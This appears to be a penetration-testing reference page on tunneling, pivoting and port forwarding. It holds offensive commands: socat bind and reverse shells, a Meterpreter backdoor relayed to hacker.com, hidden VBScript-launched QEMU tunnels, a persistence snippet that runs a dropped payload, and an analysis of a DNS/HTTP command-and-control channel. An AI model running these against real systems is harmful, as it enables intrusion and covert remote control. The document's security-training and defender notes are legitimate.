# Tunneling and Port Forwarding

{{#include ../banners/hacktricks-training.md}}

## Nmap tip

> [!WARNING]
> Nmap's proxy support is limited to TCP connections and does not affect ping, port, or OS-detection scans. When the scanner is behind a SOCKS proxy, **disable host discovery** (`-Pn`) and use a **TCP connect scan** (`-sT`).<sup>[[5]](#references)</sup>

## **Bash**

**Host -> Jump -> InternalA -> InternalB**

The final command uses Evil-WinRM's `-u` and `-i` options to identify the account and WinRM host; its default WinRM port is 5985.<sup>[[4]](#references)</sup>

```bash
# On the jump server connect the port 3333 to the 5985
mknod backpipe p;
nc -lvnp 5985 0<backpipe | nc -lvnp 3333 1>backpipe

# On InternalA accessible from Jump and can access InternalB
## Expose port 3333 and connect it to the winrm port of InternalB
exec 3<>/dev/tcp/internalB/5985
exec 4<>/dev/tcp/Jump/3333
cat <&3 >&4 &
cat <&4 >&3 &

# From the host, you can now access InternalB from the Jump server
evil-winrm -u username -i Jump
```

## **SSH**

OpenSSH can forward X11 connections, arbitrary TCP ports, and Unix-domain sockets over its encrypted channel.<sup>[[6]](#references)</sup>

SSH graphical connection (X)

`-Y` enables trusted X11 forwarding and `-C` requests compression for forwarded data.<sup>[[6]](#references)</sup>

```bash
ssh -Y -C <user>@<ip> #-Y is less secure but faster than -X
```

### Remote Port2Port

Open new Port in SSH Server --> Other port

Remote (`-R`) forwarding listens on the SSH server and connects to the local side; the explicit bind address controls which interfaces can reach that listener.<sup>[[6]](#references)</sup>

```bash
ssh -R 0.0.0.0:10521:127.0.0.1:1521 user@10.0.0.1 #Local port 1521 accessible in port 10521 from everywhere
```

```bash
ssh -R 0.0.0.0:10521:10.0.0.1:1521 user@10.0.0.1 #Remote port 1521 accessible in port 10521 from everywhere
```

### Port2Port

Local port --> Compromised host (SSH) --> Third_box:Port

Local (`-L`) forwarding listens on the client and connects to the destination from the SSH server side.<sup>[[6]](#references)</sup>

```bash
ssh -i ssh_key <user>@<ip_compromised> -L <attacker_port>:<ip_victim>:<remote_port> [-p <ssh_port>] [-N -f]  #This way the terminal is still in your host
#Example
sudo ssh -L 631:<ip_victim>:631 -N -f -l <username> <ip_compromised>
```

### Port2hostnet (proxychains)

Local Port --> Compromised host (SSH) --> Wherever

Dynamic (`-D`) forwarding creates a local SOCKS4/SOCKS5 listener whose connections are opened from the remote side.<sup>[[6]](#references)</sup>

```bash
ssh -f -N -D <attacker_port> <username>@<ip_compromised> #All sent to local port will exit through the compromised server (use as proxy)
```

### Reverse Port Forwarding

This is useful to get reverse shells from internal hosts through a DMZ to your host:

The server's `GatewayPorts` setting controls whether a remote forward may bind beyond loopback; its default is `no`.<sup>[[7]](#references)</sup>

```bash
ssh -i dmz_key -R <dmz_internal_ip>:443:0.0.0.0:7000 root@10.129.203.111 -vN
# Now you can send a rev to dmz_internal_ip:443 and capture it in localhost:7000
# Note that port 443 must be open
# Also, remmeber to edit the /etc/ssh/sshd_config file on Ubuntu systems
# and change the line "GatewayPorts no" to "GatewayPorts yes"
# to be able to make ssh listen in non internal interfaces in the victim (443 in this case)
```

### VPN-Tunnel

This root-based example creates tunnel devices on both hosts. The server must permit tun forwarding and the selected account must have access to the tun device; `PermitRootLogin yes` is one way to use the `root` account here.<sup>[[6]](#references)[[7]](#references)</sup>\
`PermitRootLogin yes`\
`PermitTunnel yes`

```bash
ssh root@server -w any:any #This will create Tun interfaces in both devices
ip addr add 1.1.1.2/32 peer 1.1.1.1 dev tun0 #Client side VPN IP
ip link set tun0 up #Activate the client side network interface
ip addr add 1.1.1.1/32 peer 1.1.1.2 dev tun0 #Server side VPN IP
ip link set tun0 up #Activate the server side network interface
```

Enable forwarding on the Server side

```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A POSTROUTING -s 1.1.1.2 -o eth0 -j MASQUERADE
```

Set a new route on the client side

```
route add -net 10.0.0.0/16 gw 1.1.1.1
```

> [!NOTE]
> **Security – Terrapin Attack (CVE-2023-48795)**  
> OpenSSH 9.6 added a strict-KEX extension to counter Terrapin's early-transport integrity attack. Update both peers where possible and follow vendor guidance for older implementations instead of assuming that a forwarded channel is protected by the version alone.<sup>[[8]](#references)</sup>

## SSHUTTLE

You can **tunnel** via **ssh** all the **traffic** to a **subnetwork** through a host.\
For example, forwarding all the traffic going to 10.10.10.0/24

`sshuttle` provides transparent proxying over SSH and supports selecting subnets and a custom SSH command as shown below.<sup>[[9]](#references)</sup>

```bash
pip install sshuttle
sshuttle -r user@host 10.10.10.10/24
```

Connect with a private key

```bash
sshuttle -D -r user@host 10.10.10.10 0/0 --ssh-cmd 'ssh -i ./id_rsa'
# -D : Daemon mode
```

## Meterpreter

Metasploit's `portfwd` supports local and remote forwarding, while its SOCKS proxy module is intended to work with session routes or `autoroute` and listens on port 1080 by default in these examples.<sup>[[10]](#references)[[11]](#references)[[12]](#references)</sup>

### Port2Port

Local port --> Compromised host (active session) --> Third_box:Port

```bash
# Inside a meterpreter session
portfwd add -l <attacker_port> -p <Remote_port> -r <Remote_host>
```

### SOCKS

```bash
background# meterpreter session
route add <IP_victim> <Netmask> <Session> # (ex: route add 10.10.10.14 255.255.255.0 8)
use auxiliary/server/socks_proxy
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
```

Another way:

```bash
background #meterpreter session
use post/multi/manage/autoroute
set SESSION <session_n>
set SUBNET <New_net_ip> #Ex: set SUBNET 10.1.13.0
set NETMASK <Netmask>
run
use auxiliary/server/socks_proxy
set VERSION 4a
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
```

## Cobalt Strike

Cobalt Strike's Beacon can relay SOCKS4a/SOCKS5 connections through a Beacon; `rportfwd` binds on the compromised host, while `rportfwd_local` initiates the destination connection from the Cobalt Strike client.<sup>[[13]](#references)[[14]](#references)</sup>

### SOCKS proxy

Open a port in the Team Server on the interfaces that should route traffic through the Beacon.<sup>[[13]](#references)</sup>

```bash
beacon> socks 1080
[+] started SOCKS4a server on: 1080

# Set port 1080 as proxy server in proxychains.conf
proxychains nmap -n -Pn -sT -p445,3389,5985 10.10.17.25
```

### rPort2Port

> [!WARNING]
> In this case, the **port is opened in the Beacon host**, not in the Team Server, and the traffic is sent to the Team Server and from there to the indicated host:port.<sup>[[14]](#references)</sup>

```bash
rportfwd [bind port] [forward host] [forward port]
rportfwd stop [bind port]
```

The reverse-forwarding manual notes the following behavior:<sup>[[14]](#references)</sup>

- Beacon's reverse port forward is designed to **tunnel traffic to the Team Server, not for relaying between individual machines**.
- Traffic is **tunneled within Beacon's C2 traffic**, including P2P links.
- High ports usually avoid privileged-port restrictions, but the target OS policy and existing listeners still apply.

### rPort2Port local

> [!WARNING]
> In this case, the **port is opened in the Beacon host**, not in the Team Server, and the **traffic is sent to the Cobalt Strike client** (not to the Team Server) and from there to the indicated host:port.<sup>[[14]](#references)</sup>

```bash
rportfwd_local [bind port] [forward host] [forward port]
rportfwd_local stop [bind port]
```

## reGeorg

[https://github.com/sensepost/reGeorg](https://github.com/sensepost/reGeorg)

The project supplies web tunnel endpoints such as `tunnel.aspx`, `tunnel.ashx`, `tunnel.jsp`, and `tunnel.php`; upload one supported endpoint before starting the local proxy.<sup>[[15]](#references)</sup>

```bash
python reGeorgSocksProxy.py -p 8080 -u http://upload.sensepost.net:8080/tunnel/tunnel.jsp
```

## Chisel

You can download it from the releases page of [https://github.com/jpillora/chisel](https://github.com/jpillora/chisel)\
Chisel carries TCP/UDP traffic over HTTP using an SSH-protected connection; use compatible client/server builds and verify the selected release's command syntax.<sup>[[16]](#references)</sup>

### socks

```bash
./chisel server -p 8080 --reverse #Server -- Attacker
./chisel-x64.exe client 10.10.14.3:8080 R:socks #Client -- Victim
#And now you can use proxychains with port 1080 (default)

./chisel server -v -p 8080 --socks5 #Server -- Victim (needs to have port 8080 exposed)
./chisel client -v 10.10.10.10:8080 socks #Attacker
```

### Port forwarding

```bash
./chisel_1.7.6_linux_amd64 server -p 12312 --reverse #Server -- Attacker
./chisel_1.7.6_linux_amd64 client 10.10.14.20:12312 R:4505:127.0.0.1:4505 #Client -- Victim
```

## Ligolo-ng

[https://github.com/nicocha30/ligolo-ng](https://github.com/nicocha30/ligolo-ng)

The Ligolo-ng quickstart documents a TUN interface on the proxy, certificate-fingerprint validation for the agent, and route setup for the tunneled network.<sup>[[17]](#references)</sup>

### Tunneling

```bash
# Start proxy server and automatically generate self-signed TLS certificates -- Attacker
sudo ./proxy -selfcert
# Create an interface named "ligolo" -- Attacker
interface_create --name "ligolo"
# Print the currently used certificate fingerprint -- Attacker
certificate_fingerprint
# Start the agent with certification validation -- Victim
./agent -connect <ip_proxy>:11601 -v -accept-fingerprint <fingerprint>
# Select the agent -- Attacker
session
1
# Start the tunnel on the proxy server -- Attacker
tunnel_start --tun "ligolo"
# Display the agent's network configuration -- Attacker
ifconfig
# Create a route to the agent's specified network -- Attacker
interface_add_route --name "ligolo" --route <network_address_agent>/<netmask_agent>
# Display the tun interfaces -- Attacker
interface_list
```

### Agent Binding and Listening

Ligolo-ng can add listeners on the agent that forward to a proxy-side address, and its reserved `240.0.0.0/4` range can be routed to reach agent-local services.<sup>[[18]](#references)[[19]](#references)</sup>

```bash
# Establish a tunnel from the proxy server to the agent
# Create a TCP listening socket on the agent (0.0.0.0) on port 30000 and forward incoming TCP connections to the proxy (127.0.0.1) on port 10000 -- Attacker
listener_add --addr 0.0.0.0:30000 --to 127.0.0.1:10000 --tcp
# Display the currently running listeners on the agent -- Attacker
listener_list
```

### Access Agent's Local Ports

```bash
# Establish a tunnel from the proxy server to the agent
# Create a route to redirect traffic for 240.0.0.1 to the Ligolo-ng interface to access the agent's local services -- Attacker
interface_add_route --name "ligolo" --route 240.0.0.1/32
```

## Rpivot

[https://github.com/klsecservices/rpivot](https://github.com/klsecservices/rpivot)

Rpivot starts the reverse tunnel from the victim and exposes a SOCKS4 proxy on the attacker's loopback address; its README also documents NTLM-proxy credentials and hash options.<sup>[[20]](#references)</sup>

```bash
attacker> python server.py --server-port 9999 --server-ip 0.0.0.0 --proxy-ip 127.0.0.1 --proxy-port 1080
```

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999
```

Pivot through **NTLM proxy**

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --password P@ssw0rd
```

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --hashes 9b9850751be2515c8231e5189015bbe6:49ef7638d69a01f26d96ed673bf50c45
```

## **Socat**

[https://github.com/andrew-d/static-binaries](https://github.com/andrew-d/static-binaries)

Socat composes address types such as `TCP-LISTEN`, `EXEC`, `SOCKS4A`, `OPENSSL`, and `PROXY`; the examples below combine those documented endpoints.<sup>[[21]](#references)</sup>

### Bind shell

```bash
victim> socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane
attacker> socat FILE:`tty`,raw,echo=0 TCP4:<victim_ip>:1337
```

### Reverse shell

```bash
attacker> socat TCP-LISTEN:1337,reuseaddr FILE:`tty`,raw,echo=0
victim> socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
```

### Port2Port

```bash
socat TCP4-LISTEN:<lport>,fork TCP4:<redirect_ip>:<rport> &
```

### Port2Port through socks

```bash
socat TCP4-LISTEN:1234,fork SOCKS4A:127.0.0.1:google.com:80,socksport=5678
```

### Meterpreter through SSL Socat

```bash
#Create meterpreter backdoor to port 3333 and start msfconsole listener in that port
attacker> socat OPENSSL-LISTEN:443,cert=server.pem,cafile=client.crt,reuseaddr,fork,verify=1 TCP:127.0.0.1:3333
```

```bash
victim> socat.exe TCP-LISTEN:2222 OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|TCP:hacker.com:443,connect-timeout=5
#Execute the meterpreter
```

You can traverse a **non-authenticated proxy** with socat's documented `PROXY` address type by executing this line instead of the last one in the victim's console.<sup>[[21]](#references)</sup>

```bash
OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|PROXY:hacker.com:443,connect-timeout=5|TCP:proxy.lan:8080,connect-timeout=5
```

[https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/](https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/)

### SSL Socat Tunnel

**/bin/sh console**

Create certificates on both sides: Client and Server

```bash
# Execute these commands on both sides
FILENAME=socatssl
openssl genrsa -out $FILENAME.key 1024
openssl req -new -key $FILENAME.key -x509 -days 3653 -out $FILENAME.crt
cat $FILENAME.key $FILENAME.crt >$FILENAME.pem
chmod 600 $FILENAME.key $FILENAME.pem
```

```bash
attacker-listener> socat OPENSSL-LISTEN:433,reuseaddr,cert=server.pem,cafile=client.crt EXEC:/bin/sh
victim> socat STDIO OPENSSL-CONNECT:localhost:433,cert=client.pem,cafile=server.crt
```

### Remote Port2Port

Connect the local SSH port (22) to the 443 port of the attacker host

```bash
attacker> sudo socat TCP4-LISTEN:443,reuseaddr,fork TCP4-LISTEN:2222,reuseaddr #Redirect port 2222 to port 443 in localhost
victim> while true; do socat TCP4:<attacker>:443 TCP4:127.0.0.1:22 ; done # Establish connection with the port 443 of the attacker and everything that comes from here is redirected to port 22
attacker> ssh localhost -p 2222 -l www-data -i vulnerable #Connects to the ssh of the victim
```

## Plink.exe

Plink is PuTTY's command-line connection tool, with SSH forwarding options similar to `ssh`.<sup>[[22]](#references)</sup>

Use uppercase `-P` for the SSH port. `-pw` is retained for compatibility but exposes the password in the process list; prefer key authentication or `-pwfile` where possible.<sup>[[22]](#references)[[23]](#references)</sup>

As this binary will be executed in the victim and it is an SSH client, open the SSH service and port for the reverse connection; the following uses `-R` to forward a locally accessible port to the attacker's machine.<sup>[[22]](#references)</sup>

```bash
echo y | plink.exe -l <Our_valid_username> -pw <valid_password> [-P <port>] -R <port_ in_our_host>:<next_ip>:<final_port> <your_ip>
echo y | plink.exe -l root -pw password [-P 2222] -R 9090:127.0.0.1:9090 10.11.0.41 #Local port 9090 to out port 9090
```

## Windows netsh

### Port2Port

Use a context with the permissions required by the host when creating or changing persistent `portproxy` rules. Microsoft documents the `v4tov4` add, show, and delete forms used below.<sup>[[24]](#references)</sup>

```bash
netsh interface portproxy add v4tov4 listenaddress= listenport= connectaddress= connectport= protocol=tcp
# Example:
netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=4444 connectaddress=10.10.10.10 connectport=4444
# Check the port forward was created:
netsh interface portproxy show v4tov4
# Delete port forward
netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444
```

## SocksOverRDP & Proxifier

You need to have **RDP access over the system**.\
Download:

SocksOverRDP uses Remote Desktop Dynamic Virtual Channels to carry a SOCKS5 connection over an existing RDP session; the client plugin listens on `127.0.0.1:1080` while the server component runs on the RDP target.<sup>[[25]](#references)</sup>

1. [SocksOverRDP x64 Binaries](https://github.com/nccgroup/SocksOverRDP/releases) - This tool uses `Dynamic Virtual Channels` (`DVC`) from the Remote Desktop Service feature of Windows. DVC is responsible for **tunneling packets over the RDP connection**.
2. [Proxifier Portable Binary](https://www.proxifier.com/download/#win-tab)

In your client computer load **`SocksOverRDP-Plugin.dll`** like this:

```bash
# Load SocksOverRDP.dll using regsvr32.exe
C:\SocksOverRDP-x64> regsvr32.exe SocksOverRDP-Plugin.dll
```

Now we can **connect** to the **victim** over **RDP** using **`mstsc.exe`**, and we should receive a **prompt** saying that the **SocksOverRDP plugin is enabled**, and it will **listen** on **127.0.0.1:1080**.

**Connect** via **RDP** and upload & execute in the victim machine the `SocksOverRDP-Server.exe` binary:

```
C:\SocksOverRDP-x64> SocksOverRDP-Server.exe
```

Now, confirm in you machine (attacker) that the port 1080 is listening:

```
netstat -antb | findstr 1080
```

Now you can use [**Proxifier**](https://www.proxifier.com/) to proxy the traffic through that port.<sup>[[26]](#references)</sup>

## Proxify Windows GUI Apps

You can make Windows GUI apps navigate through a proxy using [**Proxifier**](https://www.proxifier.com/).<sup>[[26]](#references)</sup>\
In **Profile -> Proxy Servers** add the IP and port of the SOCKS server.\
In **Profile -> Proxification Rules** add the name of the program to proxify and the connections to the IPs you want to proxify; Proxifier rules can match applications, target hosts, and ports.<sup>[[27]](#references)</sup>

## Tunnel through an NTLM proxy

The previously mentioned tool, **Rpivot**, can relay through an NTLM-authenticating proxy. **OpenVPN** can also route through one when configured with an auth file and the NTLMv2 method; this is proxy traversal, not a bypass of proxy authentication.<sup>[[20]](#references)[[28]](#references)</sup>

```bash
http-proxy <proxy_ip> 8080 <file_with_creds> ntlm2
```

### Cntlm

[http://cntlm.sourceforge.net/](http://cntlm.sourceforge.net/)

Cntlm authenticates to upstream NTLM proxies, exposes local listeners, and can map a local tunnel port to a destination service; clients can then use that local port.<sup>[[29]](#references)</sup>\
For example that forward port 443

```
Username Alice
Password P@ssw0rd
Domain CONTOSO.COM
Proxy 10.0.0.10:8080
Tunnel 2222:<attackers_machine>:443
```

Now, if you set for example in the victim the **SSH** service to listen in port 443, you can connect to it through the attacker port 2222.<sup>[[29]](#references)</sup>\
You could also use a **meterpreter** that connects to localhost:443 while the attacker listens on port 2222.<sup>[[29]](#references)</sup>

## YARP

YARP (Yet Another Reverse Proxy) is Microsoft's .NET reverse-proxy toolkit. You can find it here: [https://github.com/microsoft/reverse-proxy](https://github.com/microsoft/reverse-proxy).<sup>[[30]](#references)</sup>

## DNS Tunneling

### Iodine

[https://code.kryo.se/iodine/](https://code.kryo.se/iodine/)

Iodine creates an IPv4 tunnel through DNS queries and uses TUN interfaces; the documented setup requires the privileges needed to create those interfaces on both ends.<sup>[[31]](#references)</sup>

```
attacker> iodined -f -c -P P@ssw0rd 1.1.1.1 tunneldomain.com
victim> iodine -f -P P@ssw0rd tunneldomain.com -r
#You can see the victim at 1.1.1.2
```

DNS transport has higher overhead than direct TCP and is typically slow; you can create a compressed SSH connection through this tunnel by using:<sup>[[31]](#references)</sup>

```
ssh <user>@1.1.1.2 -C -c blowfish-cbc,arcfour -o CompressionLevel=9 -D 1080
```

### DNSCat2

[**Download it from here**](https://github.com/iagox86/dnscat2)**.**

Dnscat2 establishes an encrypted command-and-control channel through DNS; the server and client commands below follow its documented usage.<sup>[[32]](#references)</sup>

```bash
attacker> ruby ./dnscat2.rb tunneldomain.com
victim> ./dnscat2 tunneldomain.com

# If using it in an internal network for a CTF:
attacker> ruby dnscat2.rb --dns host=10.10.10.10,port=53,domain=mydomain.local --no-cache
victim> ./dnscat2 --dns host=10.10.10.10,port=5353
```

#### **In PowerShell**

You can use [**dnscat2-powershell**](https://github.com/lukebaggett/dnscat2-powershell) to run a dnscat2 client in PowerShell; its README documents the `Start-Dnscat2` parameters shown below.<sup>[[33]](#references)</sup>

```
Import-Module .\dnscat2.ps1
Start-Dnscat2 -DNSserver 10.10.10.10 -Domain mydomain.local -PreSharedSecret somesecret -Exec cmd
```

#### **Port forwarding with dnscat**

Dnscat2's interactive `listen` command maps a local listener to a remote host and port.<sup>[[32]](#references)</sup>

```bash
session -i <sessions_id>
listen [lhost:]lport rhost:rport #Ex: listen 127.0.0.1:8080 10.0.0.20:80, this bind 8080port in attacker host
```

#### Change proxychains DNS

Proxychains-ng hooks dynamically linked TCP connections and cannot carry UDP or ICMP; DNS proxying is configurable, so inspect the installed `proxychains.conf` and resolver helper instead of assuming a fixed public resolver. Legacy `proxyresolv` scripts expose `PROXY_DNS_SERVER` for choosing the resolver; use a resolver reachable from the pivot when internal names are required.<sup>[[34]](#references)[[35]](#references)</sup>

## Tunnels in Go

[https://github.com/hotnops/gtunnel](https://github.com/hotnops/gtunnel)

### Custom DNS TXT / HTTP JSON C2 (AK47C2)

The Storm-2603 actor created a **dual-channel C2 ("AK47C2")** that abuses *only* outbound **DNS** and **plain HTTP POST** traffic – two protocols that are rarely blocked on corporate networks.<sup>[[2]](#references)</sup>

1. **DNS mode (AK47DNS)**
   • Generates a random 5-character SessionID (e.g. `H4T14`).  
   • Prepends `1` for *task requests* or `2` for *results* and concatenates different fields (flags, SessionID, computer name).  
   • Each field is **XOR-encrypted with the ASCII key `VHBD@H`**, hex-encoded, and glued together with dots – finally ending with the attacker-controlled domain:

   ```text
   <1|2><SessionID>.a<SessionID>.<Computer>.update.updatemicfosoft.com
   ```

   • Requests use `DnsQuery()` for **TXT** (and fallback **MG**) records.  
   • When the response exceeds 0xFF bytes the backdoor **fragments** the data into 63-byte pieces and inserts the markers:
     `s<SessionID>t<TOTAL>p<POS>` so the C2 server can reorder them.

2. **HTTP mode (AK47HTTP)**
   • Builds a JSON envelope:
   ```json
   {"cmd":"","cmd_id":"","fqdn":"<host>","result":"","type":"task"}
   ```
   • The whole blob is XOR-`VHBD@H` → hex → sent as the body of a **`POST /`** with header `Content-Type: text/plain`.
   • The reply follows the same encoding and the `cmd` field is executed with `cmd.exe /c <command> 2>&1`.

Blue Team notes
• Look for unusual **TXT queries** whose first label is long hexadecimal and always end in one rare domain.  
• A constant XOR key followed by ASCII-hex is easy to detect with YARA: `6?56484244?484` (`VHBD@H` in hex).  
• For HTTP, flag text/plain POST bodies that are pure hex and multiple of two bytes.

{{#note}}
The channel keeps each sub-domain label within the 63-octet DNS limit, but protocol compliance alone does not make it stealthy; rare domains, long hexadecimal labels, and query volume remain detection signals.<sup>[[2]](#references)[[36]](#references)</sup>
{{#endnote}}

## ICMP Tunneling

### Hans

[https://github.com/friedrich/hans](https://github.com/friedrich/hans)\
[https://github.com/albertzak/hanstunnel](https://github.com/albertzak/hanstunnel)

Hans documents an IPv4-over-ICMP tunnel using a TUN device and ICMP echo requests; the setup requires privileges sufficient to create the interface.<sup>[[37]](#references)</sup>

```bash
./hans -v -f -s 1.1.1.1 -p P@ssw0rd #Start listening (1.1.1.1 is IP of the new vpn connection)
./hans -f -c <server_ip> -p P@ssw0rd -v
ping 1.1.1.100 #After a successful connection, the victim will be in the 1.1.1.100
```

### ptunnel-ng

[**Download it from here**](https://github.com/utoni/ptunnel-ng.git).

ptunnel-ng transports TCP connections over ICMP and uses the `-p`, `-l`, `-r`, and `-R` options shown below for the proxy, local listener, destination host, and destination port.<sup>[[38]](#references)</sup>

```bash
# Generate it
sudo ./autogen.sh

# Server -- victim (needs to be able to receive ICMP)
sudo ptunnel-ng
# Client - Attacker
sudo ptunnel-ng -p <server_ip> -l <listen_port> -r <dest_ip> -R <dest_port>
# Try to connect with SSH through ICMP tunnel
ssh -p 2222 -l user 127.0.0.1
# Create a socks proxy through the SSH connection through the ICMP tunnel
ssh -D 9050 -p 2222 -l user 127.0.0.1
```

## ngrok

[**ngrok**](https://ngrok.com/) is an agent for putting local network services online through a secure tunnel; its CLI documents HTTP, TCP, and file URL endpoints, and the printed endpoint hostname can vary by endpoint and account.<sup>[[39]](#references)</sup>

### Installation

- Create an account: https://ngrok.com/signup
- Client download:

```bash
tar xvzf ~/Downloads/ngrok-v3-stable-linux-amd64.tgz -C /usr/local/bin
chmod a+x ./ngrok
# Init configuration, with your token
./ngrok config edit
```

### Basic usages

**Documentation:** [https://ngrok.com/docs/getting-started/](https://ngrok.com/docs/getting-started/).

_The agent also supports authentication and TLS options when needed.<sup>[[39]](#references)</sup>_

#### Tunneling TCP

```bash
# Pointing to 0.0.0.0:4444
./ngrok tcp 4444
# Example of resulting link: 0.tcp.ngrok.io:12345
# Listen (example): nc -nvlp 4444
# Remote connect (example): nc $(dig +short 0.tcp.ngrok.io) 12345
```

#### Exposing files with HTTP

```bash
./ngrok http file:///tmp/httpbin/
# Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
```

#### Sniffing HTTP calls

_Useful for XSS,SSRF,SSTI ..._\
The standalone agent exposes its HTTP inspection interface at `http://127.0.0.1:4040` by default; the interface is for HTTP traffic.<sup>[[40]](#references)</sup>

#### Tunneling internal HTTP service

The `--host-header=rewrite` option rewrites the upstream HTTP `Host` header to match the local service.<sup>[[41]](#references)</sup>

```bash
./ngrok http localhost:8080 --host-header=rewrite
# Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
# With basic auth
./ngrok http localhost:8080 --host-header=rewrite --auth="myuser:mysuperpassword"
```

#### ngrok.yaml simple configuration example

This uses ngrok Agent Config v2; named tunnels use `proto` and `addr` and are started with `ngrok start`.<sup>[[42]](#references)</sup> It opens 3 tunnels:

- 2 TCP
- 1 HTTP with static files exposition from /tmp/httpbin/

```yaml
version: 2
tunnels:
  mytcp:
    addr: 4444
    proto: tcp
  anothertcp:
    addr: 5555
    proto: tcp
  httpstatic:
    proto: http
    addr: file:///tmp/httpbin/
```

## Cloudflared (Cloudflare Tunnel)

Cloudflare Tunnel's `cloudflared` connector establishes outbound connections; published applications can route HTTP, HTTPS, TCP, SSH, and RDP, while quick tunnels are intended for HTTP development.<sup>[[43]](#references)[[45]](#references)</sup>

### Quick tunnel one-liner

```bash
# Expose a local web service listening on 8080
cloudflared tunnel --url http://localhost:8080
# => Generates https://<random>.trycloudflare.com that forwards to 127.0.0.1:8080
```

### SOCKS5 origin (legacy mode)

The legacy `--socks5` flag tells `cloudflared` that the local origin speaks SOCKS5; it does not create a local SOCKS5 listener. For a managed tunnel, `originRequest.proxyType: socks` configures SOCKS5 origin handling.<sup>[[44]](#references)</sup>

```bash
# Expose a local SOCKS5-speaking origin (legacy syntax)
cloudflared tunnel --url socks5://localhost:1080 --socks5
```

### Persistent tunnels with DNS

Locally managed tunnel configuration uses lower-case `tunnel`, `credentials-file`, and `url` keys as shown below.<sup>[[46]](#references)</sup>

```bash
cloudflared tunnel create mytunnel
cloudflared tunnel route dns mytunnel internal.example.com
# config.yml
tunnel: <TUNNEL-UUID>
credentials-file: /root/.cloudflared/<TUNNEL-UUID>.json
url: http://127.0.0.1:8000
```

Start the connector:

```bash
cloudflared tunnel run mytunnel
```

The connector establishes outbound connections and, by default, negotiates QUIC with fallback to HTTP/2; do not assume every deployment uses TCP/443. Run it with only the privileges required by your deployment.<sup>[[43]](#references)[[47]](#references)</sup>

## FRP (Fast Reverse Proxy)

[`frp`](https://github.com/fatedier/frp) is a Go reverse proxy supporting **TCP, UDP, HTTP/S, STCP/SUDP, TCPMUX, and XTCP**. XTCP uses P2P hole punching whose success depends on NAT. Starting with **v0.53.0** it can act as an **SSH Tunnel Gateway**, so a target host can use the stock OpenSSH client without an `frpc` binary.<sup>[[48]](#references)[[49]](#references)[[50]](#references)</sup>

### Classic reverse TCP tunnel

```bash
# Attacker / server
./frps -c frps.toml            # listens on 0.0.0.0:7000

# Victim
./frpc -c frpc.toml            # will expose 127.0.0.1:3389 on frps:5000

# frpc.toml
serverAddr = "attacker_ip"
serverPort = 7000

[[proxies]]
name       = "rdp"
type       = "tcp"
localIP    = "127.0.0.1"
localPort  = 3389
remotePort = 5000
```

### Using the new SSH gateway (no frpc binary)

```bash
# On frps (attacker)
sshTunnelGateway.bindPort = 2200   # add to frps.toml
./frps -c frps.toml

# On victim (OpenSSH client only)
ssh -R :80:127.0.0.1:8080 v0@attacker_ip -p 2200 tcp --proxy_name web --remote_port 9000
```

The above command publishes the victim's port **8080** as **attacker_ip:9000** using the stock OpenSSH client while `frps` provides the gateway.<sup>[[50]](#references)</sup>

## Covert VM-based Tunnels with QEMU

QEMU user-mode networking does not require root or administrator privilege for the virtual network, and `-netdev user,hostfwd=...` redirects TCP, UDP, or UNIX connections from the host to the guest.<sup>[[51]](#references)</sup> TrustedSec documented a Tiny Core QEMU VM and an attempted reverse SSH tunnel in an incident where host-focused EDR could miss activity inside the guest.<sup>[[1]](#references)</sup>

### Quick one-liner

```powershell
# Windows victim (user-mode networking; no TAP driver is needed for this example)
qemu-system-x86_64.exe ^
   -m 256M ^
   -drive file=tc.qcow2,if=ide ^
   -netdev user,id=n0,hostfwd=tcp::2222-:22 ^
   -device e1000,netdev=n0 ^
   -nographic
```

• The command above launches a **Tiny Core Linux** guest with 256 MiB of guest memory and a qcow2 disk image; the disk image is not an in-RAM disk.
• Port **2222/tcp** on the Windows host is transparently forwarded to **22/tcp** inside the guest.  
• From the attacker’s point of view the target simply exposes port 2222; any packets that reach it are handled by the SSH server running in the VM.

### Launching stealthily through VBScript

TrustedSec observed VBS-driven QEMU launches and Tiny Core images in the incident cited above.<sup>[[1]](#references)</sup>

```vb
' update.vbs – lived in C:\ProgramData\update
Set o = CreateObject("Wscript.Shell")
o.Run "stl.exe -m 256M -drive file=tc.qcow2,if=ide -netdev user,id=n0,hostfwd=tcp::2222-:22", 0
```

Running the script with `cscript.exe //B update.vbs` keeps the window hidden.<sup>[[1]](#references)</sup>

### In-guest persistence

The cited incident describes persistence in the stateless Tiny Core guest through `/opt/bootlocal.sh` and `/opt/filetool.lst`:<sup>[[1]](#references)</sup>

1. Drop payload to `/opt/123.out`  
2. Append to `/opt/bootlocal.sh`:

   ```sh
   while ! ping -c1 45.77.4.101; do sleep 2; done
   /opt/123.out
   ```

3. Add `home/tc` and `opt` to `/opt/filetool.lst` so the payload is packed into `mydata.tgz` on shutdown.

### Telemetry considerations

• The host still exposes the QEMU process, qcow2 image, and any host-forwarded listener.
• Host-only process scans may not inspect guest processes, but virtualization is not guaranteed evasion; network, QEMU, and image telemetry can still expose it.<sup>[[1]](#references)[[51]](#references)</sup>

### Defender tips

• Alert on **unexpected QEMU/VirtualBox/KVM binaries** in user-writable paths.  
• Block outbound connections that originate from `qemu-system*.exe`.  
• Hunt for rare listening ports (2222, 10022, …) binding immediately after a QEMU launch.

## IIS/HTTP.sys relay nodes via `HttpAddUrl` (ShadowPad)

